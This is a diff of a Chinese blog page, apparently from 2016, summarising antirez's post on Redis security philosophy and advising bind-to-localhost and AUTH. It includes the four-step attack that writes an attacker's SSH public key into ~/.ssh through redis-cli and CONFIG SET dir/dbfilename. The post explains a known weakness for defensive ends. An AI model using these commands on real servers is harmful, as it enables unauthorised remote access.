@@ -2,20 +2,20 @@
 <html lang="zh-CN">
 <head>
   <meta charset="UTF-8">
-  <title>Spring - 璐濒殉漂流记</title>
+  <title>Redis的安全哲学 - 璐濒殉漂流记</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
   
-  <meta name="description" content="Spring">
+  <meta name="description" content="最近看到Redis的作者antirez写的一篇blog: http://antirez.com/news/96 里面有些东西很有意思.摘录一些观点: 为什么Redis这么多&rdquo;安全漏洞&">
   <meta name="author" content="Lawulu">
-  <meta itemprop="name" content="Spring - 璐濒殉漂流记">
-  <meta itemprop="description" content="Spring">
+  <meta itemprop="name" content="Redis的安全哲学 - 璐濒殉漂流记">
+  <meta itemprop="description" content="最近看到Redis的作者antirez写的一篇blog: http://antirez.com/news/96 里面有些东西很有意思.摘录一些观点: 为什么Redis这么多&rdquo;安全漏洞&">
   <meta itemprop="image" content="https://lawulu.github.io/img/author.jpg">
   <meta name="twitter:card" content="summary" />
   <meta name="twitter:site" content="@inza9hi" />
-  <meta name="twitter:title" content="Spring - 璐濒殉漂流记" />
+  <meta name="twitter:title" content="Redis的安全哲学 - 璐濒殉漂流记" />
   
   <meta name="twitter:description" content="">
-  <link rel="alternate" href="https://lawulu.github.io/feed.xml" title="璐濒殉漂流记" type="application/rss+xml"/>
+  
   <link rel="shortcut icon" href="https://lawulu.github.io/img/favicon.ico"/>
   <link rel="apple-touch-icon" href="https://lawulu.github.io/apple-touch-icon.png" />
   <link rel="apple-touch-icon-precomposed" href="https://lawulu.github.io/apple-touch-icon.png" />
@@ -59,21 +59,146 @@
 
   </header>
   <div id="container">
-    <div id="main">
-      
-      <h2 id="2015-08">2015-08</h2>
-      
-      <section class="post" itemscope itemprop="blogPost">
-    <a href="https://lawulu.github.io/post/%E4%B8%80%E7%A7%8D%E7%BB%9F%E4%B8%80%E7%9A%84API%E7%AD%BE%E5%90%8D%E6%A0%A1%E9%AA%8C%E6%96%B9%E6%B3%95/" title="一种统一的API签名校验实现" itemprop="url">
-    <h1 itemprop="name">一种统一的API签名校验实现</h1>
-    <p itemprop="description">签名方法: Header: @RequestHeader(value = &quot;x-header-timestamp&quot;) Long timestamp, @RequestHeader(value = &quot;x-header-appid&quot;) String appid, @RequestHeader(value = &quot;x-header-sign&quot;) String sign 源串 orignalString: HttpMethod=URI&amp;Param1=Value1&amp;Param2=Value2RequestBodySeckeyTimestamp 注1:Method大写 注2:为方便期间Param不排序,如果出问题再说 注3:ResustB</p>
-    <time datetime="2015-08-10 00:00:00 &#43;0000 UTC" itemprop="datePublished">2015年08月10日</time>
-  </a>
-</section>
+    <div id="main" class="post" itemscope itemprop="blogPost">
+	<article itemprop="articleBody">
+    <header class="article-info clearfix">
+  <h1 itemprop="name">
+      <a href="https://lawulu.github.io/post/Redis%E7%9A%84%E5%AE%89%E5%85%A8%E5%93%B2%E5%AD%A6/" title="Redis的安全哲学" itemprop="url">Redis的安全哲学</a>
+  </h1>
+  <p class="article-author">By
+    
+      <a href="" title="Lawulu">Lawulu</a>
+    
+  </p>
+  <p class="article-time">
+    <time datetime="2016-02-15 00:00:00 &#43;0000 UTC" itemprop="datePublished">2016年02月15日</time>
+  </p>
+</header>
 
-      
-      
+	<div class="article-content">
+    
+		<div class="toc-article">
+			<strong class="toc-title">文章目录</strong>
+      <nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li><a href="#为什么redis这么多-安全漏洞">为什么Redis这么多&rdquo;安全漏洞&rdquo;?</a></li>
+<li><a href="#一次hack过程">一次Hack过程</a></li>
+<li><a href="#为什么不默认bind-127-0-0-1">为什么不默认bind 127.0.0.1?</a></li>
+<li><a href="#使用auth">使用Auth</a></li>
+</ul></li>
+</ul>
+</nav>
+		</div>
+    
+    
+
+<p>最近看到Redis的作者antirez写的一篇blog: <a href="http://antirez.com/news/96">http://antirez.com/news/96</a>
+里面有些东西很有意思.摘录一些观点:</p>
+
+<h2 id="为什么redis这么多-安全漏洞">为什么Redis这么多&rdquo;安全漏洞&rdquo;?</h2>
+
+<p>作者说经常收到一些Redis不安全的Report,但是大部分Report其实跟Redis没有什么关系或者说对Redis来说无关紧要.因为Redis的绝大多数用户都是将Redis放到一个安全的环境里面,而安全是一个很大的feature,Redis不会为了一小撮用户做开发这么复杂的功能.
+&gt;it’s totally insecure to let untrusted clients access the system, please protect it from the outside world yourself</p>
+
+<h2 id="一次hack过程">一次Hack过程</h2>
+
+<p>安全页面写到: <a href="http://redis.io/topics/security">http://redis.io/topics/security</a>
+&gt;the ability to control the server configuration using the CONFIG command makes the client able to change the working directory of the program and the name of the dump file. This allows clients to write RDB Redis files at random paths, that is a security issue that may easily lead to the ability to run untrusted code as the same user as Redis is running</p>
+
+<p>所以,使用config命令可以往主机的Path写文件,作者展示了这一过程(为防止有些<code>script kiddies cut &amp; paste the attack</code>,没有直接提供一个脚本,并且还首先备份了当前的数据,这里省略一些无关紧要的步骤):</p>
+
+<ol>
+<li>生成一对RSA key,并且写到一个文件里面,前后加上换行符
+<code>
+$ (echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; foo.txt
+</code></li>
+<li>将public key写到一个KV里面
+<code>
+cat foo.txt | redis-cli -h 192.168.1.11 -x set crackit
+</code></li>
+<li>设置工作目录
+<code>
+config set dir /Users/antirez/.ssh/
+</code></li>
+<li>将内存中数据保存到Db文件中
+<code>
+config set dbfilename &quot;authorized.keys&quot;
+save
+</code></li>
+</ol>
+
+<p>大功告成!</p>
+
+<h2 id="为什么不默认bind-127-0-0-1">为什么不默认bind 127.0.0.1?</h2>
+
+<p>事实上,如果启动时候带上默认的配置文件(redis.conf),就不存在这个安全隐患,因为配置文件里面默认是只绑定了Loopback address.既然作者知道这个安全隐患,为什么不默认启用这个配置文件呢?(就像Mysql那样).</p>
+
+<p>作者的解释是,因为RTFM（Read The Fucking Manual）</p>
+
+<h2 id="使用auth">使用Auth</h2>
+
+<p>虽然并不能真正解决安全问题..最简单有效的方法就是使用Auth.使用Auth的的几点说明:
+1. 密码要尽可能的复杂,以防被brute force
+2. Auth的消耗非常少,只是在连接建立时候做一次鉴权,只有连接在,就不用再做鉴权
+3. 未来可能会有ACL机制,比如某些用户并没有<code>config set dir</code>的权限</p>
+
+	</div>
+  <footer class="article-footer clearfix">
+  
+
+<div class="article-tags">
+  <span></span>
+  
+  <a href="https://lawulu.github.io/tags/redis">redis</a>
+  
+  <a href="https://lawulu.github.io/tags/%E5%AE%89%E5%85%A8">安全</a>
+  
+</div>
+
+
+
+
+
+<div class="article-categories">
+  <span></span>
+  
+  <a class="article-category-link" href="https://lawulu.github.io/categories/akiross">AkiRoss</a>
+  
+</div>
+
+
+
+  <div class="article-share" id="share">
+    <div data-url="https://lawulu.github.io/post/Redis%E7%9A%84%E5%AE%89%E5%85%A8%E5%93%B2%E5%AD%A6/" data-title="Redis的安全哲学" data-tsina="" class="share clearfix">
     </div>
+  </div>
+</footer>
+
+	</article>
+  
+<section class="comment">
+  <div class="ds-thread" data-thread-key="https://lawulu.github.io/post/Redis%E7%9A%84%E5%AE%89%E5%85%A8%E5%93%B2%E5%AD%A6/"
+   data-title="Redis的安全哲学" data-url="https://lawulu.github.io/post/Redis%E7%9A%84%E5%AE%89%E5%85%A8%E5%93%B2%E5%AD%A6/"></div>
+</section>
+<script type="text/javascript">
+var duoshuoQuery = {short_name:"inza9hi"};
+(function() {
+  var ds = document.createElement('script');
+  ds.type = 'text/javascript';ds.async = true;
+  ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+  ds.charset = 'UTF-8';
+  (document.getElementsByTagName('head')[0]
+  || document.getElementsByTagName('body')[0]).appendChild(ds);
+})();
+</script>
+
+
+
+
+</div>
+
     <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>
 <div id="asidepart">
 <div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div>
@@ -222,10 +347,6 @@
 
 
   
-<div class="rsspart">
-  <a rel="nofollow" href="https://lawulu.github.io/feed.xml" type="application/rss+xml" target="_blank">RSS 订阅</a>
-</div>
-
 
 </aside>
 </div>
@@ -320,6 +441,38 @@ $(document).ready(function(){
 
 <script type="text/javascript">
 $(document).ready(function(){
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      h  = $('article h2')
+      ah = $('article h2'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  if(ah.length==0){
+    t.css('display','none');
+  }else{
+    c.click(function(){
+      ta.css('display', 'block').addClass('fadeIn');
+    });
+    o.click(function(){
+      ta.css('display', 'none');
+    });
+    $(window).scroll(function(){
+      ta.css("top",Math.max(140,320-$(this).scrollTop()));
+    });
+  };
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){
   var $this = $('.share'),
       url = $this.attr('data-url'),
       encodedUrl = encodeURIComponent(url),
@@ -346,6 +499,27 @@ $(document).ready(function(){
 });
 </script>
 
+
+<link rel="stylesheet" href="https://lawulu.github.io/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="https://lawulu.github.io/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+});
+</script>
 
 
 
